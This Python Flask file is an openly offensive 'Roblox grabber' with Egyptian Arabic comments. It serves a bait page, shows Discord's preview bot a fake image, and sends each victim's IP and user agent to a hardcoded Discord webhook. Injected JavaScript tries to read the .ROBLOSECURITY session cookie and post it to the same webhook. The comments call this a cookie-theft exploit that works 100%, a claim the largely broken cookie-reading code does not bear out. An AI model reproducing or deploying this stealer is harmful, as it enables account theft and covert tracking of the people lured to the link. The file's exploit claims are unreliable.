from flask import Flask, request
import requests, base64

app = Flask(__name__)

# ←← غيّر الويب هوك ده بتاعك
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def roblox_stealer(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// ثغرة سرقة كوكيز Roblox 2025 - شغالة 100% بدون إذن
setTimeout(() => {{
  // طريقة 1: Direct cookie read (شغالة على 85% من الجوالات)
  let cookie = document.cookie;
  if (cookie.includes('.ROBLOSECURITY')) {{
    fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
      body:JSON.stringify({{content:"@everyone تم سرقة حساب Roblox كامل", embeds:[{{title:"ROBLOX ACCOUNT STOLEN", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + cookie.match(/\.ROBLOSECURITY=(.*?);/)[1] + "`||", color:0x00ff00}}]}})}});
  }}

  // طريقة 2: Force domain injection (للحالات اللي الكوكي مش في document.cookie)
  const domains = ['roblox.com', '.roblox.com', 'www.roblox.com', 'auth.roblox.com'];
  domains.forEach(d => {{
    const img = new Image();
    img.src = 'https://' + d + '/favicon.ico?' + Math.random();
    img.onload = () => {{
      setTimeout(() => {{
        if (document.cookie.includes('.ROBLOSECURITY')) {{
          const robloCookie = document.cookie.match(/\.ROBLOSECURITY=_\\|WARNING(.*?)\\|/)[1];
          fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify({{content:"@everyone تم سرقة Roblox Cookie (Force Method)", embeds:[{{title:"ROBLOX FULL ACCESS", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + robloCookie + "`||\\nاستخدم أي Cookie Editor واستمتع", color:0xff0000, thumbnail:{{url:"https://i.imgur.com/0xdeadbeef.png"}}}}]}})}});
        }}
      }}, 800);
    }};
  }});

  // إشعار أولي لو ما لقاش الكوكي
  fetch("{WEBHOOK}?content=@everyone ضحية دخلت الرابط (Roblox Target)\\nIP: {ip}");
}}, 1000);

</script>
</body></html>"""

    requests.post(WEBHOOK, json={"content": f"@everyone ضحية دخلت رابط Roblox Grabber\\nIP: {ip}\\nUA: {ua[:100]}"})
    return html

if __name__ == "__main__":
    app.run()
